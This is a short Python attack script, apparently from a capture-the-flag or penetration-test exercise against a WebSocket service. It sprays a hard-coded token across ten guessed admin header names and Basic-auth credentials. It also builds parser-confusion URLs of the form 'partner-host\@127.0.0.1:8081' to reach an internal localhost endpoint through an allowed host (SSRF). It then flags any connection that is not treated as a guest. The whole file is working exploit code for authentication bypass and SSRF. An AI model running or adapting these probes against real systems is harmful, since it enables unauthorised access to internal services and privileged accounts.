import time, select, base64
from ws import connect, recv_frame
TOK="9f2c7e14a6b3d508c1e04f7a2b8d6350a17e9c4b2d6f8035e1c9a7b4d2f60813"
hdr_names=["X-Admin-Token","X-Vault-Token","X-Auth-Token","X-VaultLink-Admin","Admin-Token",
           "X-Maintenance-Token","X-Ops-Token","X-Relay-Token","X-Session-Token","X-Vaultlink-Token"]
cases=[]
for n in hdr_names: cases.append((n,{"inner":None,"hdr":{n:TOK}}))
cases.append(("basic gateway",{"hdr":{"Authorization":"Basic "+base64.b64encode(f"admin:{TOK}".encode()).decode()}}))
for q in ["token","auth","admin_token","vault_token","key","t"]:
    cases.append((f"inner?{q}",{"inner":f"http://rates.partner-forex.example.com\\@127.0.0.1:8081/ws?{q}={TOK}"}))
for name,c in cases:
    try:
        s,resp=connect(inner=c.get("inner"), extra_headers=c.get("hdr")); s.setblocking(False)
        out=[]; end=time.time()+0.9
        while time.time()<end:
            r,_,_=select.select([s],[],[],0.1)
            if r:
                try: out.append(recv_frame(s)[1])
                except Exception: out.append(b"EOF"); break
        s.close()
        hit = "  <<<<" if not any(x.endswith(b"guest") for x in out if isinstance(x,bytes)) else ""
        print(f"{name:22s}", out, hit)
    except Exception as e: print(name,"EXC",e)
